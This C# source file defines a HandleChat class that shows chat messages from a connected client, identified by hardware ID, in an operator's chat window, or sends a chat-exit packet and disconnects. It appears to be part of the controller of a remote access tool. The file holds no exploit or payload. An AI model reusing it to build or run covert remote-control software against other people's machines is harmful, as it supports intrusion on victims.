namespace PEGASUS.BytesInOut
{
    using PEGASUS.Design;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System;
    using System.Drawing;
    using System.Threading;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleChat" />.
    /// </summary>
    public class HandleChat
    {
        /// <summary>
        /// The Read.
        /// </summary>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        public void Read(MsgPack unpack_msgpack, Clients client)
        {
            try
            {
                var chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
                if (chat != null)
                {
                    Console.Beep();
                    chat.richTextBox1.SelectionColor = Color.Blue;
                    chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput").AsString);
                    chat.richTextBox1.SelectionColor = Color.FromArgb(3, 130, 200);
                    chat.richTextBox1.AppendText(unpack_msgpack.ForcePathObject("WriteInput2").AsString);
                    chat.richTextBox1.SelectionStart = chat.richTextBox1.TextLength;
                    chat.richTextBox1.ScrollToCaret();
                }
                else
                {
                    var msgpack = new MsgPack();
                    msgpack.ForcePathObject("Pac_ket").AsString = "chatExit";
                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                    client.Disconnected();
                }
            }
            catch
            {
            }
        }

        /// <summary>
        /// The GetClient.
        /// </summary>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        public void GetClient(MsgPack unpack_msgpack, Clients client)
        {
            var chat = (FormChat)Application.OpenForms["chat:" + unpack_msgpack.ForcePathObject("Hwid").AsString];
            if (chat != null)
                if (chat.Client == null)
                {
                    chat.Client = client;
                    chat.textBox1.Enabled = true;
                    chat.timer1.Enabled = true;
                }
        }
    }
}
